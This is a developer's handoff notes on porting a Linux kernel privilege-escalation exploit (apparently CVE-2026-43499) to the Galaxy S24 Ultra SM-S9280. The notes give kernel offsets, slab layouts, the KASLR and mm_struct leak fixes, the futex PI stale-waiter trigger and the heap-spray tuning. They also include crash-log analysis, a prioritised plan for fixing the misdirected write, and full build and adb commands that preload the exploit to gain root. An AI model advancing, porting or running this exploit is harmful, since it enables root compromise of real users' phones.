# S9280 (SM-S9280 / e3q-S9280ZCS6DZF2) Exploit Debugging Handoff

## Device Info

- Model: SM-S9280 (Galaxy S24 Ultra, China)
- SoC: Snapdragon 8 Gen 3 (E3Q platform)
- Firmware: `BP4A.251205.006/S9280ZCS6DZF2`
- Kernel: `6.1.145-android14-11-3254743-abS9280ZCS6DZF2`
- Android: 16, Security Patch: 2026-05-05
- ADB: shell (uid=2000), no root

## Target Header

`src/targets/e3q-S9280ZCS6DZF2/target.h` — fully populated from device BTF and vmlinux.elf.

Key differences from S928U (`e3q-S928USQS6DZF2`):
- `KMALLOC_CACHES_OFF`: `0x0176cbb8` (S928U: `0x0176c6f8`, delta +0x4c0)
- `SLIDE_NFULNL_LOGGER_OFF`: `0x016a65c5` (S928U: `0x016a61b8`)
- All other offsets identical

## Fixes Applied (with evidence)

### 1. MM_STRUCT_SZ: 0x500 -> 0x3c0

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:23`

BTF reports `sizeof(struct mm_struct) = 960 (0x3c0)`. The default `0x500` was wrong.

**Effect**: KernelSnitch mm_struct leak success rate improved from ~10% to ~60%.

### 2. MM_STRUCT_SLAB_SZ: new constant 0x400

**Files**: `src/common.h:64-66`, `src/targets/e3q-S9280ZCS6DZF2/target.h:25`

SLUB rounds mm_struct to kmalloc-1k. Device slabinfo confirms:
```
mm_struct  1000  1160  1024  32  8 : tunables 0 0 0 : slabdata 38 38 0
```
`obj_size=1024 (0x400)`, `objs_per_slab=32`.

Previously `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ = 32768/960 = 34` (wrong).
Now `mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ = 32768/1024 = 32` (correct).

**Used in**: `src/util.c:746`, `src/pipe.c:131`

### 3. fops.c fd_set PSELECT_WORD_SHIFT support

**File**: `src/fops.c:77-128`

`prepare_pselect_fdsets()` was hardcoded for shift=0 layout. Rewrote to use
`fops_fdset_put_global()` which maps waiter words through `SLIDE_PSELECT_WORD_SHIFT`.

S9280 uses `SLIDE_PSELECT_WORD_SHIFT=3` (same as S928U, confirmed by identical
`__arm64_sys_pselect6` and `core_sys_select` stack frame layouts).

### 4. SKB_RECLAIM_SENDS and MM_DRAIN_TRIGGERS tuning

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h:27-29`

Changed from defaults (4 sends, 32 drains) to S928U hardware-tested baseline:
- `SKB_RECLAIM_SENDS = 28`
- `APP_SLIDE_RECLAIM_SENDS = 28`
- `MM_DRAIN_TRIGGERS = 2`

### 5. Pipe fill before pselect (CRITICAL FIX)

**File**: `src/fops.c:174-184`

**Problem**: `pselect()` returned `ret=37` immediately because pipe write-end fds
in the `out` fd_set were always writable (pipe empty). pselect never blocked,
so the stale rt_mutex waiter window never opened, and `consumer` never ran
(`calls=0`).

**Fix**: Fill the pipe to capacity (65536 bytes) before calling pselect. This
makes write-end fds not writable, forcing pselect to block.

**Result**: `ret=37 calls=0` -> `ret=4 calls=1 success=1`. pselect now blocks
and PI boost wakes it up.

### 6. Consumer completion wait

**File**: `src/fops.c:203-216`

**Problem**: `consumer` thread runs on a different core. `pselect()` returns
before `consumer` finishes `sched_setattr`, so `consumer_success` reads 0
even though `sched_setattr` eventually succeeds.

**Fix**: Bounded 200ms wait loop after `pselect()` returns, polling
`consumer_calls` until non-zero.

### 7. prepare_ctx cleanup before sk_buff sends

**File**: `src/util.c:907-921`

**Problem**: `prepare_ctx` children (holding mm_struct references) were cleaned
up AFTER `sk_buff` reclaim sends. The target slab page could not return to the
buddy allocator because its objects were still pinned.

**Fix**: Moved `prepare_ctx` cleanup (close memfds + kill children) to BEFORE
the `sendmsg()` reclaim loop.

### 8. Consumer diagnostic logging

**File**: `src/main.c:123-127`

Added `pr_info` after consumer sequence completes, showing `calls`, `success`,
and `tid`. This revealed that `sched_setattr` succeeds but pselect reads
`success=0` due to the race (fixed by #6).

### 9. KernelSnitch bruteforce stride: MM_STRUCT_SZ -> MM_STRUCT_SLAB_SZ (MAJOR)

**Files**: `src/util.c` (`setup_kernelsnitch`, `prepare_kernel_page`)

**Root cause**: The bruteforce scanned mm_struct candidates at
`mm_struct_sz = 0x3c0` stride, but SLUB lays objects out at
`obj_size = 0x400` stride (see fix #2). A candidate matches a real object only
where `lcm(0x3c0, 0x400)` coincides: slab offsets `0x0`, `0x3c00`, `0x7800`
(slots 0, 15, 30). Only 3 of 32 slots were detectable, which explains the
~60% leak rate in the root-umh path and the 24/24 failures elsewhere.

**Effect**: Both the mm_struct leak and the pipe-buffer page leak now succeed
on essentially every attempt (observed object_index values 0, 8, 9, 10, 16,
17, 31 across runs). This is a generic bug that also affects the S928U target.

### 10. Pipe page child lifecycle aligned with prepare_kernel_page

**File**: `src/pipe.c` (`prepare_pipe_buffer_page_child`)

**Problem**: The app variant failed 24/24 with
`pipe KernelSnitch sk_buff page leak failed`. The function used
`clone_memfd()` (clone + open memfd + kill immediately), so all pre/spray/post
children were dead before collision finding, unlike the working root-umh path
which keeps children alive (paused) through setup and bruteforce.

**Fix**: Clone live children, open their memfds, and reap them only after the
bruteforce, mirroring `prepare_kernel_page`. Also moved
`run_kernelsnitch_bruteforce()` to right after `waitpid(leak_child)`, before
the mass memfd frees and sk_buff sends (same position as the working path).

### 11. pr_error exits: diagnostics after pr_error were dead code

**Files**: `src/kernelsnitch/utils.h` (definition), `src/slide_app.c`

`pr_error` ends with `exit(-1)`; the compiler eliminates anything after it.
The `P0_ORACLE_GATE_DIAG` post-failure gate verification placed after
`slide_trigger_physical_slot()` fails never executed (the process had already
exited inside the pr_error in `slide_trigger_physical_slot`). The hook now
runs inside `slide_trigger_physical_slot` before the pr_error.

### 12. Runtime tuning knobs (avoid rebuilds during sweeps)

**Files**: `src/util.c`, `src/pipe.c`, `src/main.c`, `src/slide_app.c`,
`src/common.h`

- `KSNITCH_DEFAULT_PROFILE=1`: skip the reduced app KernelSnitch profile
  (2048/64/8) and keep the library default (4096/128/8).
- `SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`: override the reclaim spray
  parameters at runtime.
- `EXPLOIT_CORE`: override the exploit CPU pin (`pin_to_core(CORE)` call
  sites now go through `exploit_core()`).
- `SLIDE_CONSUMER_BURST` / `SLIDE_CONSUMER_SPACING_USEC`: fire multiple
  staggered `sched_setattr` calls per route instead of one.
- `slide cmp_requeue_pi ret=... errno=... polls=...` logging added to the
  app trigger path (previously only the leak path logged it).

### 13. Gate diagnostic continues past tee/read failures

**File**: `src/pipe.c` (`verify_p0_pipe_oracle_gate`)

A `tee()` EFAULT on a freshly filled reclaim pipe is itself a signal (the
kernel write may have touched that `pipe_buffer`). The gate check used to
abort the whole 240-pipe scan on the first failure — observed in practice:
`p0 gate tee failed pipe=33 errno=14` ended the scan after 33 pipes. It
now counts `tee_failures`, logs `p0 gate read failed` separately, scans
all pipes, and keeps references alive (`spawn_p0_ref_keeper`) whenever any
anomaly (hit / changed / tee failure) is seen.

### 14. pselect copy-back dump on write-window fires

**File**: `src/slide_app.c` (`slide_pselect_stack_copy`)

When pselect returns `ret != 0` (a fire), dump every nonzero word of the
returned `in`/`out`/`ex` fd_sets (`slide pselect copyback set=... word=...
value=...`). The kernel copies back `ceil(nfds/64)*8` bytes (40 B = 5 words
at nfds=320) from the `res_*` halves of `stack_fds`, so whatever the walk
changed on the kernel stack shows up here as ready bits. This pinpoints
*where* the write landed on the stack — distinguishing "walk modified the
stale waiter node" from "stray write hit the res sets" — and the bit offset
relative to the waiter node identifies what wrote there.

### 15. Gate marker offset must account for the -0x1000 frag delta

**File**: `src/targets/e3q-S9280ZCS6DZF2/target.h`
(`P0_ORACLE_GATE_PAGE_OFF` 0x0e80 -> 0x1e80)

The 64 KiB reclaim send maps source offset `S` to kernel address
`(base - 0x1000) + S` when the first order-3 fragment lands on the freed
block: the fragment carries payload indices `[0x1000, 0x9000)`, and the
designed offsets confirm the model — `SLIDE_BANK_TASK_OFF=0x1000` lands at
`base+0`, `SLIDE_BANK_LOCK_OFF=0x5200` at `base+0x4200`. The gate write
targets `pipe_buffer->page = direct_to_page(base)` = fragment page 0, so
the pipe read-back shows payload indices `[0x1000, 0x2000)` only. The
marker at 0x0e80 landed at `base - 0x180` (skb head territory) and could
NEVER appear in the read-back — consistent with "oracle never flips" on
both S9280 and S928U. 0x1e80 keeps the intended "0xe80 into page 0".
Note: the other targets (incl. S928U) still carry 0x0e80 and very likely
share the same bug — not changed here (minimal diff), verify before porting.

## Stack Layout Verification (disassembly)

**File**: `s9280-port/vmlinux.elf` (exact S9280ZCS6DZF2 kernel)

`__arm64_sys_pselect6`: `sub sp, #0x90` then `bl core_sys_select`.
`core_sys_select`: `sub sp, #0x1c0`; for nfds=320 (per-set bytes 0x28 < 0x2b)
the on-stack branch is taken with `stack_fds = sp + 0x50` (zeroed region
`sp+0x50..sp+0x140`, six 0x28-byte buffers).

With `E` = SP at `__arm64_sys_pselect6` entry: `stack_fds = E - 0x90 - 0x1c0 +
0x50 = E - 0x200` — byte-identical to the S928U record. The stale waiter at
`E - 0x1e8` is therefore `stack_fds + 0x18` = global word 3, and
`waiter->lock` (waiter + 0x38) = `stack_fds + 0x50` = ex-set word 0 = global
word 10 = `shift + 7`. **SLIDE_PSELECT_WORD_SHIFT=3 is confirmed for S9280 by
disassembly, matching S928U's panic readback.**

## Current Blocking Point

### PI chain walk rarely reaches the stale waiter (write window ~1/10, delay-insensitive so far)

**Location**: `src/slide_app.c` (`slide_pselect_stack_copy`), `src/fops.c`
(`do_pselect_fake_lock_route`)

**Confirmed working on S9280 (new evidence, 2026-07-31)**:

- `FUTEX_CMP_REQUEUE_PI` returns `-1 errno=35 (EDEADLK)` at `polls=1` — the
  PI deadlock setup (the bug precondition) reproduces on this device.
- `slide wait_requeue_pi ret=-1 errno=110 (ETIMEDOUT)` — the waiter stays
  blocked for the full 50 ms, consistent with the EDEADLK stale-waiter state.
- pselect stack layout / shift=3 verified by vmlinux disassembly (see above).
- **Later consumer delays — mixed evidence, no clear win**: with
  `SLIDE_ENTER_DELAY_USEC=70000`, run 1 fired on attempt 1 (`ret=2
  elapsed_usec=100172`, `p0 physical write status=0 ok=1`) and attempt 2
  panicked; run 2 fired 0/3 clean then panicked on attempt 4. But run 3
  fired **0/19** at the same 70 ms setting. Overall fire rate remains low
  (~3-4 fires in ~30 attempts) and so far looks delay-insensitive; the
  early "70 ms is much better" impression was small-sample luck.
- **First write-side signal**: in the one clean fire, pipe 33 then failed
  gate `tee()` with `errno=14 (EFAULT)` — an anomaly never seen in runs
  where the walk did not fire (`tee_failures=0` across all 240 pipes in
  every closed-window attempt). Weak evidence the write lands near pipe
  buffers, but the `RMG-P0-ORACLE-GATE` marker was not read back (the scan
  aborted at pipe 33 before fix #13; re-measurement in progress).
- **Run 4 clean fire, zero pipe anomalies**: attempt 16 fired (`ret=2
  elapsed_usec=100170`, `write ok=1`) and the improved gate scan found
  `hits=0 changed=0 tee_failures=0` across all 240 pipes — the rb write did
  NOT touch any oracle pipe. Combined with run 1, the pipe-33 EFAULT looks
  like a fluke, not the write.
- **All fires surface at the timeout boundary — but that does NOT prove the
  consumer is irrelevant**: every observed `ret=2` has
  `elapsed_usec≈100170` (the full 100 ms pselect timeout), identical to
  non-fire samples, across consumer delays of 15-100 ms. However, a stray
  write into the `res_*` halves of `stack_fds` at sched_setattr time would
  also only become visible at copy-out (nothing wakes do_select early — the
  monitored timerfd never becomes readable), so `elapsed` cannot
  discriminate *when* the walk fired. The measured fire RATE is
  delay-insensitive (0/19 at 70 ms in one run, ~1/10 overall), which is the
  stronger evidence that the consumer delay does not control the fire.
- **root-umh variant reproduces the same blocker** (2026-07-31, post fix
  #9): attempt 1 completed the full chain (tracefs KASLR ✓, mm leak ✓,
  sends 28/28 ✓, page prepare ✓, consumer sched_setattr ✓) and failed with
  `cfi misc_fops mismatch ret=0 target=ffffff80024fb5b0 read=0
  want=ffffff8923899000` — pselect `ret=0`, walk never fired, no write, no
  panic. Both routes bottleneck at walk-fire + payload placement.
- **sk_buff send cap**: `SKB_RECLAIM_SENDS=64` yields `sends=32/64` — the
  1 MiB `SO_SNDBUF` on the reclaim socket caps effective sends at ~32
  (~32 KiB charged per 64 KiB send under unix stream accounting). Raising
  the env knob beyond 32 buys nothing; more coverage needs a bigger
  `SO_SNDBUF`, not more sends.
- **SKB_SNDBUF knob works**: with `SKB_SNDBUF=4194304` (wmem_max=16 MiB on
  this device) sends reach `126/128` (~4 MiB spray). Panics still occur on
  walk fires even at 4 MiB coverage (first panic after 8 attempts vs ~4 at
  1 MiB), so coverage alone does not reliably place the payload at
  `payload_base` — either the freed block is grabbed by a non-frag
  allocation, or the panic is inherent to the erase design (the
  rb_erase_cached leftmost fixup writes `slide_oracle_parent`-derived
  pointers into the REAL `f_pi_target->waiters.rb_leftmost` /
  `task->pi_waiters.rb_leftmost`, and the follow-up top-waiter read can
  deref garbage even when the payload page is placed perfectly).

**Symptom (15-50 ms delays)**: In ~11/12 samples, pselect returns `ret=0`
after the full timeout (`elapsed_usec≈100170`) with `calls=1 sched_ok=1`.
The consumer's `sched_setattr` succeeds but the PI chain walk does not reach
the stale waiter during the pselect window.

**Interpretation**: At `sched_setattr` time the pselect task's
`pi_blocked_on` is usually already clear (or the waiter was dequeued), so
`rt_mutex_adjust_prio_chain` has no chain to walk. Fires cluster near the
~100 ms timeout boundary when they do happen, but forcing 70 ms delays did
NOT reproducibly raise the rate (0/19 in run 3). When the walk fires while
the payload page was not reclaimed (garbage `fake_lock`), the kernel
panics: multiple device reboots observed, including with
`SLIDE_CONSUMER_BURST>=2`. Panics now dominate the failure modes — reclaim
placement, not window rate, is becoming the bottleneck.

**This supersedes the earlier "cfi misc_fops mismatch: pread ret=0"
blocking point**: with fixes #9-#11 the leak stages are now reliable and the
app variant's P0 pipe oracle gives a direct reclaim+write measurement. The
remaining problem is confirming *what* the write hits when it fires (gate
marker vs. corrupted pipe_buffer vs. wrong page), with a correctly reclaimed
payload page. **Update (2026-07-31): answered by the KP #37 crash log — the
write lands in page-allocator metadata as a physmap VA, i.e. the target
address computation is wrong; see "Kernel Crash Log & ftrace Analysis"
below.**

### Previous blocking point (kept for reference)

The rb_tree write mechanism relies on `rb_erase` performing
`rb_set_parent_color(child=target, parent, color)`, i.e. writing the payload
pointer into the target:
- FOPS route: `rb_erase(fake_w0->pi_tree_entry)` with
  `parent = fake_fops`, `right = data_addr(ASHMEM_MISC_FOPS)`, `left = 0`.
- App gate route: `rb_erase(stale_waiter->tree_entry)` with
  `parent = slide_oracle_parent = direct_to_page(payload_base)`,
  `left = slide_oracle_target` (pipe_buffer address), `right = 0`.
Both need (1) the stale waiter linked in `f_pi_target`'s wait tree with
`pi_blocked_on` set, (2) sk_buff coverage of the payload page, (3) the walk
triggered by `sched_setattr` while pselect blocks.

## What Works

| Stage | Status | Evidence |
|-------|--------|----------|
| KASLR leak (tracefs) | Works | `slide-kaslr-ok base=ffffffc0080d0000` |
| KernelSnitch mm_struct leak | ~100% (was ~60%) | fix #9; leaked indices 0..31 |
| Pipe-buffer page leak (app) | ~100% (was 0/24) | fixes #9, #10 |
| sk_buff reclaim sends | 28/28 sent | `sk_buff reclaim sends=28/28` |
| pselect blocking | Works | `ret=0` after full timeout |
| FUTEX CMP_REQUEUE_PI EDEADLK | Works | `ret=-1 errno=35 polls=1` |
| WAIT_REQUEUE_PI timeout | Works | `ret=-1 errno=110` |
| consumer sched_setattr | Works | `calls=1 sched_ok=1` |
| pselect stack layout / shift=3 | Verified | vmlinux disassembly (see above) |
| PI walk reaching stale waiter | ~1/10 at burst=1, delay-insensitive; **burst=3 fires attempt ~1 reliably & safely** | 1 clean fire + 2 panics in ~30 samples at 70 ms; 0/19 in run 3; ftrace run 2 clean fire |
| rb write to target (gate/fops) | **Fires but lands WRONG** (page metadata, not pipe_buffer) | `gate hits=0 changed=0` on all clean fires; KP #37 stack: physmap VA written into struct page lru (see crash log section) |

## Next Steps for the Next Person

The leak stages are reliable (see What Works). The blocker is the PI chain
walk: fire rate ~1/10 (delay-insensitive — the 60-100 ms delay sweep was
done and showed no effect), and most fires end in a kernel panic before any
measurement. Ordered plan:

### Priority 1: Validate the gate marker fix (#15) on clean fires

Run an automated loop (marker 0x1e80, 4 MiB sndbuf, 128 sends). To raise
the ~1/10 walk-fire rate, burst the consumer sched_setattr three times
per pselect window (60/75/90 ms); each call re-tests the dangling
`pi_blocked_on` independently:

```sh
adb shell "P0_ORACLE_GATE_DIAG=1 SKB_SNDBUF=4194304 SKB_RECLAIM_SENDS=128 \
  SLIDE_ENTER_DELAY_USEC=60000 SLIDE_CONSUMER_BURST=3 \
  SLIDE_CONSUMER_SPACING_USEC=15000 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id"
```

- `p0 gate marker pipe=N` / `gate hits=1`: reclaim + write chain fully
  works → go to Priority 4.
- Clean fire with `hits=0` across all 240 pipes: the write target/page is
  still wrong — re-derive `pipebuf_page_base` placement or the rb target.
- Only panics: go to Priority 2/3.

### Priority 2: Owner-unlock trigger (implemented as fix #16, testing)

The consumer's `sched_setattr` only walks the chain when the pselect task's
`pi_blocked_on` survived (racy, ~1/10). The owner-unlock trigger does not
depend on `pi_blocked_on` at all: with `SLIDE_OWNER_UNLOCK=1`, the owner
thread `FUTEX_UNLOCK_PI`s `f_pi_target` on command (signalled by the
consumer via `slide_owner_unlock_go` instead of calling `sched_setattr`) —
`rt_mutex_slowunlock` dequeues the top waiter, which is the stale waiter
whenever it is still linked (the CVE condition), running
`rb_erase(stale->tree_entry)` = the write. See `slide_owner_thread` /
consumer burst loop in `src/slide_app.c`.
Caveat: the unlock path also wakes the dequeued waiter (`wake_q` on
`fake_task`), so the payload's fake task fields must survive a wakeup —
`try_to_wake_up(fake_task)` returns early when state==0 (TASK_RUNNING),
which the zeroed payload satisfies. Watch for `slide owner unlock_pi
ret=0` + `write status=0 ok=1` in the first test runs; if unlock returns
an error or mislocks, adjust from the errno.

**First owner-unlock test (2026-07-31, delay=70 ms, 24 attempts, 0 panics)**:
`unlock_pi ret=0` on every attempt — the unlock path itself is safe (no
panic, no mislock). But `write status=256 ok=0` everywhere with
`pselect ret=0`, `gate hits=0 changed=0 tee_failures=0` across all 240
pipes, and EDEADLK/ETIMEDOUT still reproducing (`errno=35 polls=1`,
`errno=110`). The completely clean pipe scan means the rb write did NOT
fire (a fired write would redirect `pipe_buffer->page` and change the
gate read-back even when the reclaim missed). Second test with
`SLIDE_ENTER_DELAY_USEC=5000` (unlock ~10 ms after the waiter's 50 ms
timeout) showed the same — timing is not the variable.

**Conclusion (fix #16 dead end, 2026-07-31)**: the owner-unlock trigger
cannot work for this bug shape. The EDEADLK requeue failure leaves the
waiter genuinely blocked on `f_pi_target`'s rt_mutex until its 50 ms
timeout; the timeout cleanup removes the node from `lock->waiters`, so
by the time the waiter has re-armed the freed stack frame via pselect
(any pselect time), the owner unlock finds an empty tree and no-ops.
The sched_setattr fires instead go through the waiter's dangling
`pi_blocked_on` residue (~10 % race: the cleanup sometimes leaves it
pointing at the freed stack frame) and `rt_mutex_adjust_prio_chain`
erases/reinserts the ARMED `tree_entry`/`pi_tree_entry` nodes regardless
of actual tree membership — the write does not require the node to be in
any tree at all. Owner unlock requires exactly that membership. The
`SLIDE_OWNER_UNLOCK` code stays (env-gated, harmless) but the route is
abandoned; the ~1/10 sched_setattr walk remains the only trigger.

### Priority 3: If panics persist with correct placement, re-derive erase params

Hypothesis: even with the payload page placed perfectly, the erase can
panic via `rb_erase_cached`'s leftmost fixup, which writes
`slide_oracle_parent`-derived pointers into the REAL
`f_pi_target->waiters.rb_leftmost` / `task->pi_waiters.rb_leftmost`;
the follow-up top-waiter read may deref garbage. If clean-fire data shows
the payload IS placed (gate hit or copyback consistent) yet panics follow,
redesign the fake rb node so the leftmost fixup writes into payload
memory (e.g. point `parent` at a payload rb_node, or arrange a right
child so the successor path stays inside the payload).

### Priority 4: After a gate hit, run WITHOUT the diag gate

`P0_ORACLE_GATE_DIAG=1` forces `slide_leak_physical_base()` to return 0
right after the gate check (`src/slide_app.c:750`) — diag mode can never
proceed to root. Once `hits=1` is observed, re-run without
`P0_ORACLE_GATE_DIAG`; the flow continues: `app_publish_p0_dirty()` ->
probe slot -> `scan_p0_pipe_oracle()` -> restore -> fops write -> root.

Kernel panics (device reboots) are an inherent cost of these scans — run
long sweeps in the background, write logs to files, and expect adb to drop
for ~60-90 s per reboot. If `adb devices` suddenly shows an empty list
while the device is actually up, restart the adb server
(`adb kill-server`) — but never while a scan is running, it kills the
active shell session too.

## Kernel Crash Log & ftrace Analysis (2026-07-31)

### Crash log sources that actually work (shell-readable)

| Source | Content | Verdict |
|--------|---------|---------|
| `/data/log/prev_dump.log` | dumpstate capture of the PREVIOUS boot, incl. `LAST KMSG (/proc/reset_klog)` with the **full kernel panic stack + all-CPU register dumps** | **Use this.** Re-captured every boot; pull after every panic |
| `/data/log/power_off_reset_reason.txt` | One line per boot: reset type (`RP`/`KP`/`NP`) + panic PC/LR signature for every kernel panic (26 so far) | Panic census without pulling full dumps |
| `dumpsys dropbox` `SYSTEM_LAST_KMSG_*_KP` | XBL/ABL bootloader log only, no kernel stack | Useless for panics |
| `/data/log/dumpstate_lastkmsg_*.log.gz` | same as dropbox | Useless |
| `/sys/fs/pstore`, `/proc/last_kmsg`, `/proc/kallsyms`, `dmesg` | — | All denied for shell |
| `dumpsys dropbox` `SYSTEM_TOMBSTONE` | userspace crashes only (KernelSU probes SIGSYS, one Immich SIGSEGV) | No exploit-process tombstones (process exits cleanly) |

`/data/log` is broadly shell-readable (dropbox.txt, ewlogd, ...). Pull:
`adb pull /data/log/prev_dump.log` (overwritten each boot — pull before the
next panic or it rotates).

### burst=3 + ftrace run 2 (`/tmp/traced-run2.log`, fix #15 marker 0x1e80)

- `SLIDE_CONSUMER_BURST=3 SPACING=15000 ENTER_DELAY=60000`: attempt 1 fired
  cleanly (`pselect ret=2 elapsed=100651 calls=3 sched_ok=3`) and the
  pselect copy-back dump (`src/slide_app.c` fix #14) captured two non-zero
  words: `set=in word=3 value=0000000000000001`,
  `set=ex word=1 value=0000000100000000` — direct evidence the walk rewrote
  two stack qwords. `write status=0 ok=1`, slot 0 write 1/1, walk completed
  **without crashing**. burst=3 is safe and nearly always fires attempt 1;
  the earlier "burst causes panics" belief was wrong.
- But `p0 pipe gate hits=0 changed=0 tee_failures=0` — the write still does
  not land on the oracle pipe; fix #15's marker has never been observed.
- ftrace (`sched_switch`/`sched_process_exit`/`sched_pi_setprio` — these
  three event enables + `trace`/`tracing_on`/`trace_pipe` ARE shell-writable;
  kprobe_events/current_tracer/lock events are SELinux-denied): all exploit
  threads exited cleanly ~0.3 s before the panic; the kernel died at
  285.03 s (dropbox KP #37 13:00). `sched_pi_setprio` only fires for binder
  (2 events system-wide); our SCHED_BATCH+nice sched_setattr produces none.
- Capture recipe: clear `trace` -> enable events ->
  `(nohup cat /sys/kernel/tracing/trace_pipe > /data/local/tmp/trace-cap.txt &)`
  -> run exploit -> after reboot grep on-device then `adb pull` (~300 MB raw;
  pull from `$HOME`, Windows adb cannot write `/tmp`).

### KP #37 full stack (from prev_dump.log) — the key evidence

```
HeapTaskDaemon pid 2940 (system_server GC thread), madvise path:
  __list_del_entry_valid+0xbc/0xd4   (kernel BUG at lib/list_debug.c:61)
  release_pages+0x308  <- free_pages_and_swap_cache <- tlb_finish_mmu
  <- zap_page_range_single <- do_madvise
list_del corruption. prev->next should be fffffffe23266a08,
  but was ffffff88078d0800. (prev=fffffffe22647408)
```

- The corrupted object is a **`struct page` lru linkage in vmemmap**
  (`0xfffffffe...`); the value written into it, `0xffffff88078d0800`, is a
  **physmap linear-map VA** (phys `0x78d0800`) — exactly the shape of a
  `direct_to_page`/`phys_to_virt`-style payload address. The rb write is
  landing in page-allocator metadata, not on the pipe_buffer page. This is
  the hard proof behind `gate hits=0`: **write placement / address
  computation is wrong (suspected vmemmap-vs-physmap confusion in
  `slide_oracle_target`/`slide_oracle_parent`), not a timing problem**.
- At panic time our `id` process (pid 14000) was still alive on CPU0, inside
  `clone -> copy_mm -> __vm_enough_memory` (forking the next attempt). So
  the refined panic model is **misdirected write + innocent-bystander
  detonation**: the stray write lands on a random `struct page`, and
  whichever unrelated process next touches it (here: GC madvise freeing
  pages) takes the BUG. Explains both "22 attempts no panic" (writes miss
  anything hot) and "fire -> panic shortly after, timing varies".
- Other call traces in the same log are benign: kswapd0 GFP_NOIO alloc
  failure at boot (possibly our 4 MiB SKB spray pressure), binder/
  wpa_supplicant `__rtnl_unlock` slow warnings (WiFi driver).

### Panic signature census (26 KPs, power_off_reset_reason.txt)

- **17x** `_raw_spin_trylock+0x1c/0xa4`, LR `0xXXXXXXXX092X284c` — upper 32
  bits clobbered randomly, lower bits are kernel text (~`0xffffffc009XX284c`).
  Meaning: spin_lock on a corrupted/freed object.
- **4x** `rt_mutex_adjust_prio_chain` (+0x1ec/+0x26c/+0x4a4/+0x858) — the
  walk itself tripping on the stale PI chain (also 2x on 2026-07-08, RWC
  11/12, early experiments).
- **3x** `__list_del_entry_valid+0xbc` (DEBUG_LIST) — incl. KP #37 above.

To get register-level context for the rt_mutex_adjust_prio_chain variant,
trigger one more panic of that type and pull `prev_dump.log` — x19-x23 in
the dump are the chain pointers and can be compared directly against the
armed-node layout (`src/slide_app.c:162-234`, `prepare_slide_pselect_fdsets`).

### Refined model & immediate follow-ups

1. Correlate copy-back `in word=3` / `ex word=1` with the armed-node layout
   (shift=3 word table) to compute which two stack qwords rb_erase actually
   rewrote — should reveal the target/parent offset error.
2. Re-audit `slide_oracle_target` (= pipebuf page base + GATE_OBJECT_INDEX *
   PIPE_OBJECT_SIZE) and `slide_oracle_parent` (= direct_to_page(payload)):
   the KP #37 write value being a physmap VA inside vmemmap metadata says at
   least one of the two computations picks the wrong mapping class.
3. After any further panic: `adb pull /data/log/prev_dump.log` FIRST (it
   rotates each boot), then check `power_off_reset_reason.txt` tail.

## Files Modified

All S9280-related changes are uncommitted working-tree changes (the
checkout is CRLF, so plain `git diff` shows whole-file noise — use
`git diff -w`). Do not commit yet.

| File | Changes |
|------|---------|
| `src/targets/e3q-S9280ZCS6DZF2/` | New target (untracked): header, fingerprint; `P0_ORACLE_GATE_PAGE_OFF` 0x0e80 -> 0x1e80 (fix #15) |
| `src/common.h` | `MM_STRUCT_SLAB_SZ`; runtime knobs (`SKB_RECLAIM_SENDS`, `MM_DRAIN_TRIGGERS`, `KSNITCH_DEFAULT_PROFILE`); `exploit_core()` declaration |
| `src/fops.c` | Shift-aware `prepare_pselect_fdsets`, pipe fill before pselect, consumer completion wait |
| `src/util.c` | KernelSnitch bruteforce stride `MM_STRUCT_SZ` -> `MM_STRUCT_SLAB_SZ` (fix #9); `EXPLOIT_CORE`/`exploit_core()`; cleanup before sends; knob plumbing; `SKB_SNDBUF` env override |
| `src/pipe.c` | `objs_per_slab` uses `MM_STRUCT_SLAB_SZ`; pipe page child lifecycle aligned with `prepare_kernel_page` (fix #10); gate diagnostic continues past tee/read failures with `tee_failures` counter (fix #13) |
| `src/main.c` | `exploit_core()` call sites; consumer diagnostic logging |
| `src/slide_app.c` | `P0_ORACLE_GATE_DIAG` gate-verify on trigger failure; `cmp_requeue_pi` logging; `SLIDE_CONSUMER_BURST`/`SLIDE_CONSUMER_SPACING_USEC`; `SLIDE_ENTER_DELAY_USEC`/`PSELECT_DELAY_USEC` delay forcing; pselect copy-back dump on fires (fix #14); `SLIDE_OWNER_UNLOCK` owner-unlock trigger (fix #16) |

## Build & Test

```sh
# Build (requires Android NDK r29)
export ANDROID_NDK_HOME=/path/to/android-ndk
make TARGET=e3q-S9280ZCS6DZF2

# Test root-umh variant
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/cve-2026-43499
adb shell "EXPLOIT_ATTEMPTS=8 EXPLOIT_ATTEMPT_TIMEOUT_SEC=45 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/id"

# Test app variant (requires release build)
make TARGET=e3q-S9280ZCS6DZF2 release
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.release.so \
  /data/local/tmp/cve-2026-43499-app.so
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499-app.so /system/bin/id"

# P0 gate oracle scan (debug build, background, log to file)
make TARGET=e3q-S9280ZCS6DZF2
adb push build/e3q-S9280ZCS6DZF2/cve-2026-43499-app.so \
  /data/local/tmp/cve-2026-43499-app-dbg.so
adb shell "P0_ORACLE_GATE_DIAG=1 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499-app-dbg.so /system/bin/id" \
  > /tmp/gate-scan.log 2>&1
# Expect kernel panics / device reboots; adb returns after ~60-90 s.
# Files in /data/local/tmp survive reboots.
```

On this machine: `adb` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/platform-tools/adb.exe`
(WSL interop), `ANDROID_NDK_HOME` =
`/mnt/c/Users/rainchan/AppData/Local/Android/Sdk/ndk/29.0.14206865`

## References

- S928U debugging record: `docs/SM-S928U1-S928U1UES6DZF2.md`
- Porting guide: `docs/PORTING.md`
- Project README: `README.md`
